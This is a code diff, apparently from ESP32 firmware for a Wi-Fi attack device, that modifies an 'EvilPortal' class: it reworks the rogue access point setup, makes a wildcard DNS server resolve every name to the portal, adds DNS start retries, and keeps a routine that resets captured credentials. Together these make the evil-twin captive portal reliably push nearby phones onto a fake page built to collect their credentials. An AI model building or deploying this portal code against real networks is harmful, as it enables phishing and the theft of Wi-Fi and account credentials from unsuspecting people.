@@ -8,7 +8,6 @@
 #include "root/net/webInterface.h"
 #include "root/net/wifi_common.h"
 #include "esp_wifi.h"
-#include <esp_idf_version.h>
 #include "wifi_atks.h"
 
 static DNSServer &sharedEvilPortalDnsServer() {
@@ -124,27 +123,14 @@ bool EvilPortal::setup() {
 }
 
 void EvilPortal::configureSoftAp() {
-    if (_verifyPwd) WiFi.mode(WIFI_MODE_APSTA);
-    else WiFi.mode(WIFI_MODE_AP);
-
-    // 4th argument is the DHCP pool start (0 = AP address + 1).
-    // 5th is the DNS server handed to clients. On this core a zero DNS is omitted
-    // from the lease, so phones associate and sit at "no internet" without opening the page.
-    if (!WiFi.softAPConfig(
-            apGateway, apGateway, IPAddress(255, 255, 255, 0), IPAddress((uint32_t)0), apGateway
-        )) {
-        Serial.println("[PORTAL] softAPConfig failed");
+    if (apGateway == IPAddress((uint32_t)0)) apGateway = IPAddress(172, 0, 0, 1);
+    // Shared helper: DNS in DHCP lease + DHCPS recovery after captive-portal option.
+    // Previous enableDhcpCaptivePortal() failure path left DHCPS stopped so phones
+    // got 169.254.* and could not open the portal page.
+    const wifi_mode_t mode = _verifyPwd ? WIFI_MODE_APSTA : WIFI_MODE_AP;
+    if (!wifiStartPortalAp(apName, emptyString, _channel, apGateway, mode)) {
+        Serial.printf("[PORTAL] AP start failed ssid='%s' ch%d\n", apName.c_str(), _channel);
     }
-    if (!WiFi.softAP(apName, emptyString, _channel)) {
-        Serial.printf("[PORTAL] softAP failed for SSID '%s' on ch%d\n", apName.c_str(), _channel);
-    }
-#if ESP_IDF_VERSION >= ESP_IDF_VERSION_VAL(5, 4, 2)
-    // DHCP option 114. Modern phones open this URL instead of only probing over the internet.
-    if (!WiFi.AP.enableDhcpCaptivePortal()) {
-        Serial.println("[PORTAL] DHCP captive portal URI failed");
-    }
-#endif
-    wifiConnected = true;
 }
 
 void EvilPortal::beginAP() {
@@ -160,8 +146,14 @@ void EvilPortal::beginAP() {
     setupRoutes();
     IPAddress dnsIp = WiFi.softAPIP();
     if (dnsIp == IPAddress((uint32_t)0)) dnsIp = apGateway;
-    if (!dnsServer->start(53, "*", dnsIp)) { Serial.println("[PORTAL] DNS server failed to start"); }
+    dnsServer->setErrorReplyCode(DNSReplyCode::NoError);
+    if (!dnsServer->start(53, "*", dnsIp)) {
+        Serial.println("[PORTAL] DNS server failed to start — retry");
+        vTaskDelay(pdMS_TO_TICKS(100));
+        if (!dnsServer->start(53, "*", dnsIp)) Serial.println("[PORTAL] DNS server failed");
+    }
     webServer.begin();
+    Serial.printf("[PORTAL] HTTP+DNS on http://%s/\n", dnsIp.toString().c_str());
 }
 
 void EvilPortal::setupRoutes() {
@@ -299,7 +291,12 @@ void EvilPortal::restartWiFi(bool reset) {
     setupRoutes();
     IPAddress dnsIp = WiFi.softAPIP();
     if (dnsIp == IPAddress((uint32_t)0)) dnsIp = apGateway;
-    if (!dnsServer->start(53, "*", dnsIp)) { Serial.println("[PORTAL] DNS server failed to start"); }
+    dnsServer->setErrorReplyCode(DNSReplyCode::NoError);
+    if (!dnsServer->start(53, "*", dnsIp)) {
+        Serial.println("[PORTAL] DNS server failed to start — retry");
+        vTaskDelay(pdMS_TO_TICKS(100));
+        dnsServer->start(53, "*", dnsIp);
+    }
     webServer.begin();
 
     if (reset) resetCapturedCredentials();
